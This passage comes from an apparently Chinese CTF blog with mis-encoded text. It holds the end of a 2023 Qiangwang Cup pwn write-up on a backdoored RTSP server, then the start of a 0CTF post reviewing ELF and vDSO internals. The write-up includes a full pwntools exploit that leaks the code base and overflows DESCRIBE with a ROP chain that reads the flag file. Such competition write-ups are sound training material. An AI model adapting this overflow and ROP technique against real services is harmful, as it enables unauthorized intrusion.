more flag<br>.rodata:000000000007B40B0000000CCvul_string:<br><br>.rodata:000000000007B3F9 aQwb            db &#x27;qwb&#x27;,0 <br></code></pre></td></tr></table></figure></li></ul><p>ä¸€å…±ä¸‰ä¸ªåé—¨</p><ul><li><p>handleCmd_GET_PARAMETERè·å–ä¸€ä¸ªç¨‹åºåœ°å€</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor1.png" class title="backdoor1"></li><li><p>handleCmd_SET_PARAMETERå¯ä»¥è®¾ç½®ä¸€ä¸ªæ ‡å¿—ä½</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor2.png" class title="backdoor2"></li><li><p>handleCmd_DESCRIBEè®¾ç½®æ ‡å¿—ä½åå­˜åœ¨æº¢å‡º</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor3.png" class title="backdoor3"></li></ul><h2 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h2><ul><li><p>wavAudioTestç›¸å…³çš„æ“ä½œè¦å…ˆSETUP</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/session.png" class title="session"></li><li><p>GET_PARAMETERå¦‚æœæ˜¯å¯¹wavAudioTestæ“ä½œå®é™…è°ƒç”¨çš„ä¸æ˜¯RTSPClientConnectionå¯¹è±¡çš„handleCmd_GET_PARAMETERè€Œä¸æ˜¯RTSPClientSessionå¯¹è±¡çš„</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/client.png" class title="client"><p>åˆ†åˆ«è°ƒç”¨ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨æ ˆ</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientconnection.png" class title="clientconnection"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientsession.png" class title="clientsession"><p>åˆ¤æ–­åœ¨handleRequestByteså‡½æ•°ä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp">     <span class="hljs-keyword">if</span> (urlIsRTSPS != fOurRTSPServer.fOurConnectionsUseTLS) &#123;<br>         <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;OPTIONS&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (urlPreSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-comment">// The special &quot;*&quot; URL means: an operation on the entire server.  This works only for GET_PARAMETER and SET_PARAMETER:</span><br>           <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_GET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientConnectionå¯¹è±¡</span><br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_SET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_notSupported</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DESCRIBE&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">handleCmd_DESCRIBE</span>(urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SETUP&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;TEARDOWN&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PLAY&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PAUSE&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span><br> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">if</span> (clientSession != <span class="hljs-literal">NULL</span>) &#123;<br>             clientSession-&gt;<span class="hljs-built_in">handleCmd_withinSession</span>(<span class="hljs-keyword">this</span>, cmdName, urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientSessionå¯¹è±¡</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_sessionNotFound</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;REGISTER&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DEREGISTER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>  <br>     &#125;<br></code></pre></td></tr></table></figure></li><li><p>DESCRIBEæ–¹æ³•åªèƒ½å¯¹wavAudioTestæ“ä½œ</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/describe.png" class title="describe"></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;192.168.111.143&#x27;</span>,<span class="hljs-number">8554</span>)<br>shellcode=<span class="hljs-string">b&#x27;SETUP rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Session: &#x27;</span>)<br>session=p.recvuntil(<span class="hljs-string">b&#x27;;&#x27;</span>)[:-<span class="hljs-number">1</span>]<br><br>shellcode=<span class="hljs-string">b&#x27;GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;GET_INFO: 2023\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;100 maybe you need this 0x&#x27;</span>)<br>codebase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x2A9990</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(codebase))<br><br>shellcode=<span class="hljs-string">b&#x27;SET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;DESCRIBE_FLAG: qwb\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>rdi=codebase+<span class="hljs-number">0x7b133</span><br>rsi=codebase+<span class="hljs-number">0x99fb0</span><br>rdx=codebase+<span class="hljs-number">0x19eaa</span><br>rax=codebase+<span class="hljs-number">0x35e4a</span><br>flag=codebase+<span class="hljs-number">0x7B3E5</span><br>read=codebase+<span class="hljs-number">0x18200</span><br>syscall=codebase+<span class="hljs-number">0x19EAC</span><br>gift=codebase+<span class="hljs-number">0x2a9990</span><br><br>shellcode=<span class="hljs-string">b&#x27;DESCRIBE rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;vul_string: &#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">396</span>+p32(<span class="hljs-number">0x198</span>)+p32(<span class="hljs-number">0x1f4</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br><br>shellcode+=p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">7</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">5</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>shellcode+=<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 0CTF æ— ä¸­ç”Ÿæœ‰ç³»åˆ—</title>
    <link href="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/"/>
    <url>/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/</url>
    
    <content type="html"><![CDATA[<p>åœ¨TCTFå†³èµ›è¢«æ— ä¸­ç”Ÿæœ‰æŠ˜ç£¨ä¹‹åç¬¬äºŒå¤©åœ¨0CTFå†æ¬¡è¢«æš´å‡»ï¼Œå¤ç°æ¥äº†</p><span id="more"></span><h1 id="ä¸€äº›åŸºç¡€çŸ¥è¯†"><a href="#ä¸€äº›åŸºç¡€çŸ¥è¯†" class="headerlink" title="ä¸€äº›åŸºç¡€çŸ¥è¯†"></a>ä¸€äº›åŸºç¡€çŸ¥è¯†</h1><p>ä¸€äº›é“¾æ¥è£…è½½ä¸åº“çš„å¤ä¹ </p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>å°±æ˜¯è¿™ä¸ªç©æ„</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/elfheader.png" class title="elfheader"><p>EFF headerç»“æ„ä½“ï¼ˆ64ä½ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>e_ident[EI_NIDENT];<span class="hljs-comment">/* Magic number and other info */</span><br>  Elf64_Halfe_type;<span class="hljs-comment">/* Object file type */</span><br>  Elf64_Halfe_machine;<span class="hljs-comment">/* Architecture */</span><br>  Elf64_Worde_version;<span class="hljs-comment">/* Object file version */</span><br>  Elf64_Addre_entry;<span class="hljs-comment">/* Entry point virtual address */</span><br>  Elf64_Offe_phoff;<span class="hljs-comment">/* Program header table file offset */</span><br>  Elf64_Offe_shoff;<span class="hljs-comment">/* Section header table file offset */</span><br>  Elf64_Worde_flags;<span class="hljs-comment">/* Processor-specific flags */</span><br>  Elf64_Halfe_ehsize;<span class="hljs-comment">/* ELF header size in bytes */</span><br>  Elf64_Halfe_phentsize;<span class="hljs-comment">/* Program header table entry size */</span><br>  Elf64_Halfe_phnum;<span class="hljs-comment">/* Program header table entry count */</span><br>  Elf64_Halfe_shentsize;<span class="hljs-comment">/* Section header table entry size */</span><br>  Elf64_Halfe_shnum;<span class="hljs-comment">/* Section header table entry count */</span><br>  Elf64_Halfe_shstrndx;<span class="hljs-comment">/* Section header string table index */</span><br>&#125; Elf64_Ehdr;<br></code></pre></td></tr></table></figure><ul><li><p>e_identï¼šELF magic number</p></li><li><p>e_typeï¼šELFç±»å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_NONE0<span class="hljs-comment">/* No file type */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_REL1<span class="hljs-comment">/* å¯é‡å®šä½æ–‡ä»¶ï¼ˆ.oæ–‡ä»¶ï¼‰ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_EXEC2<span class="hljs-comment">/* å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé™æ€é“¾æ¥æ–‡ä»¶ï¼‰ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_DYN3<span class="hljs-comment">/* åŠ¨æ€åº“æ–‡ä»¶ï¼ˆåŠ¨æ€é“¾æ¥æ–‡ä»¶å’Œå…±äº«åº“æ–‡ä»¶ï¼‰ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_CORE4<span class="hljs-comment">/* æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼ˆcoreï¼‰ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>ET_NUM5<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOOS0xfe00<span class="hljs-comment">/* OS-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIOS0xfeff<span class="hljs-comment">/* OS-specific range end */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOPROC0xff00<span class="hljs-comment">/* Processor-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIPROC0xffff<span class="hljs-comment">/* Processor-specific range end */</span></span><br></code></pre></td></tr></table></figure></li><li><p>e_machineï¼šæ¶æ„ï¼ˆå¤ªå¤šäº†ä¸åˆ—äº†ï¼‰</p></li><li><p>e_versionï¼šELFç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NONE0<span class="hljs-comment">/* Invalid ELF version */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_CURRENT1<span class="hljs-comment">/* ä¸€èˆ¬ç”¨è¿™ä¸ª */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NUM2</span><br></code></pre></td></tr></table></figure></li><li><p>e_entryï¼šæ‰§è¡Œå…¥å£åœ°å€</p></li><li><p>e_phoffï¼šæ®µè¡¨çš„åç§»</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/%E6%AE%B5%E8%A1%A8.png" class title="æ®µè¡¨"></li><li><p>e_shoffï¼šèŠ‚è¡¨çš„åç§»ï¼ˆåœ¨ELFå°¾éƒ¨ï¼‰</p></li><li><p>e_flagsï¼šå¤„ç†å™¨æ ‡å¿—</p></li><li><p>e_ehsizeï¼šELF headerå¤§å°</p></li><li><p>e_phentsizeï¼šæ®µè¡¨æ¯ä¸€é¡¹çš„å¤§å°</p></li><li><p>e_phnumï¼šæ®µè¡¨é¡¹æ•°</p></li><li><p>e_shentsizeï¼šèŠ‚è¡¨æ¯ä¸€é¡¹çš„å¤§å°</p></li><li><p>e_shnumï¼šèŠ‚è¡¨é¡¹æ•°</p></li><li><p>e_shstrndxï¼šsection header string table index</p></li></ul><h2 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Wordp_type;<span class="hljs-comment">/* Segment type */</span><br>  Elf64_Wordp_flags;<span class="hljs-comment">/* Segment flags */</span><br>  Elf64_Offp_offset;<span class="hljs-comment">/* Segment file offset */</span><br>  Elf64_Addrp_vaddr;<span class="hljs-comment">/* Segment virtual address */</span><br>  Elf64_Addrp_paddr;<span class="hljs-comment">/* Segment physical address */</span><br>  Elf64_Xwordp_filesz;<span class="hljs-comment">/* Segment size in file */</span><br>  Elf64_Xwordp_memsz;<span class="hljs-comment">/* Segment size in memory */</span><br>  Elf64_Xwordp_align;<span class="hljs-comment">/* Segment alignment */</span><br>&#125; Elf64_Phdr;<br></code></pre></td></tr></table></figure><ul><li><p>p_typeï¼šæ®µç±»å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>PT_NULL0<span class="hljs-comment">/* æœªä½¿ç”¨ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOAD1<span class="hljs-comment">/* å¯åŠ è½½æ®µï¼Œp_fileszè¡¨ç¤ºæ®µå¤§å°ï¼Œp_memszè¡¨ç¤ºå†…å­˜å¤§å° */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_DYNAMIC2<span class="hljs-comment">/* åŠ¨æ€é“¾æ¥ä¿¡æ¯ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_INTERP3<span class="hljs-comment">/* è§£é‡Šå™¨è·¯å¾„ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_NOTE4<span class="hljs-comment">/* é™„åŠ ä¿¡æ¯çš„ä½ç½®å’Œå¤§å° */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SHLIB5<span class="hljs-comment">/* ä¿ç•™ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_PHDR6<span class="hljs-comment">/* ELF Headerå¤§å°ä½ç½® */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_TLS7<span class="hljs-comment">/* Thread-local storage segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>PT_NUM8<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOOS0x60000000<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_EH_FRAME0x6474e550<span class="hljs-comment">/* GCC .eh_frame_hdr segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_STACK0x6474e551<span class="hljs-comment">/* Indicates stack executability */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_RELRO0x6474e552<span class="hljs-comment">/* Read-only after relocation */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_PROPERTY0x6474e553<span class="hljs-comment">/* GNU property */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOSUNW0x6ffffffa</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWBSS0x6ffffffa<span class="hljs-comment">/* Sun Specific segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWSTACK0x6ffffffb<span class="hljs-comment">/* Stack segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HISUNW0x6fffffff</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIOS0x6fffffff<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOPROC0x70000000<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIPROC0x7fffffff<span class="hljs-comment">/* End of processor-specific */</span></span><br></code></pre></td></tr></table></figure></li><li><p>p_flagsï¼šæ®µæƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_X(1 &lt;&lt; 0)<span class="hljs-comment">/* Segment is executable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_W(1 &lt;&lt; 1)<span class="hljs-comment">/* Segment is writable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_R(1 &lt;&lt; 2)<span class="hljs-comment">/* Segment is readable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKOS0x0ff00000<span class="hljs-comment">/* OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKPROC0xf0000000<span class="hljs-comment">/* Processor-specific */</span></span><br></code></pre></td></tr></table></figure></li><li><p>p_vaddrï¼šæ®µè™šæ‹Ÿåœ°å€</p></li><li><p>p_paddrï¼šæ®µç‰©ç†åœ°å€</p></li><li><p>p_fileszï¼šæ–‡ä»¶é•œåƒä¸­æ®µå¤§å°</p></li><li><p>p_memszï¼šå†…å­˜é•œåƒä¸­æ®µå¤§å°</p></li><li><p>p_alignï¼šå¯¹é½ç›¸å…³ä¿¡æ¯</p></li></ul><h2 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h2><p>x86-32ä½¿ç”¨ <strong>int 0x80</strong> ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ‰§è¡Œé€Ÿåº¦å¾ˆæ…¢ï¼Œä¸ºäº†åŠ å¿«é€Ÿåº¦</p><ul><li><strong>Intel</strong>å…ˆå®ç°äº†å¿«é€Ÿç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ <strong>sysenter</strong> å’Œ <strong>sysexit</strong></li><li><strong>AMD</strong>åå®ç°äº†å¿«é€Ÿç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ <strong>syscall</strong> å’Œ <strong>sysret</strong></li></ul><p>x86-64ç»Ÿä¸€ä½¿ç”¨ <strong>syscall</strong> å’Œ <strong>sysret</strong>ï¼ŒIntelåŒæ—¶æ”¯æŒä¸¤ç§æ–¹å¼</p><ul><li><p>å‚å•†èŠ¯ç‰‡æ–—äº‰çš„ç»“æœå°±æ˜¯ä¸åŒçš„èŠ¯ç‰‡éœ€è¦ä½¿ç”¨ä¸åŒçš„å¿«é€Ÿç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼Œå› æ­¤å¼€å‘äº† <strong>vsyscall</strong> æœºåˆ¶ï¼Œå³glibcé€šè¿‡è°ƒç”¨ <strong>__kernel_vsyscall</strong> æ¥ç¡®å®šåˆ°åº•åº”è¯¥æ‰§è¡Œä»€ä¹ˆæŒ‡ä»¤</p><p><strong>__kernel_vsyscall</strong> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„é¡µï¼Œä½äºå†…æ ¸åœ°å€ç©ºé—´ï¼ˆå”¯ä¸€å…è®¸ç”¨æˆ·è®¿é—®çš„å†…æ ¸ç©ºé—´ï¼‰ï¼Œè¯¥åŒºåŸŸçš„åœ°å€å›ºå®šä¸º0xffffffffff600000ï¼ˆ64ä½ï¼‰</p></li><li><p><strong>vsyscall</strong> è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ä½œç”¨å°±æ˜¯åŠ å¿«æŸäº›ç³»ç»Ÿè°ƒç”¨çš„é€Ÿåº¦</p><p>æ¯”å¦‚æœ‰äº›ç³»ç»Ÿè°ƒç”¨åªéœ€è¦è¯»å–ä¸€äº›æ•°æ®è¿›è¡Œè®¡ç®—ï¼Œå¯ä»¥å®šæœŸå°†è¿™äº›æ•°æ®æ¨é€åˆ°å†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„å…±äº«å†…å­˜ä¸­ï¼Œå†åˆ©ç”¨ 